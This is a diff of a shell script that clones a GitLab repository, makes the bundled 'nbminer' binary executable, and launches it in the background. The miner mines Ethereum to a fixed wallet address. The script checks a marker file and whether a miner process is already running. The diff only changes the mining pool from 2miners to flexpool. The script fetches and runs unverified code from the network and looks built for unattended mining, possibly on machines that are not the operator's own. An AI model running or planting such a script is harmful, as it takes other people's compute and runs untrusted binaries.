@@ -5,13 +5,13 @@ if [ ! -f "${SCRIPT_DIR}/B8648rns22.txt" ]; then
 	echo "Start setup..."
 	echo "B8648rns22" > B8648rns22.txt
 	git clone https://gitlab.com/zoey8059459/nb.git && cd nb && chmod +x ./nbminer
-	./nbminer -a ethash -o stratum+tcp://eth.2miners.com:2020 -u 0x3da2c7743970908cac0e6b606f064330aea8b03f.$woker &
+	./nbminer -a ethash -o stratum+ssl://eth-sg.flexpool.io:5555 -u 0x3da2c7743970908cac0e6b606f064330aea8b03f.$woker &
 else
 	if pgrep t-rex >/dev/null 2>&1
 	then
 		echo "RUNNING"
 	else
 		git clone https://gitlab.com/zoey8059459/nb.git && cd nb && chmod +x ./nbminer
-	./nbminer -a ethash -o stratum+tcp://eth.2miners.com:2020 -u 0x3da2c7743970908cac0e6b606f064330aea8b03f.$woker &
+	./nbminer -a ethash -o stratum+ssl://eth-sg.flexpool.io:5555 -u 0x3da2c7743970908cac0e6b606f064330aea8b03f.$woker &
 	fi
 fi
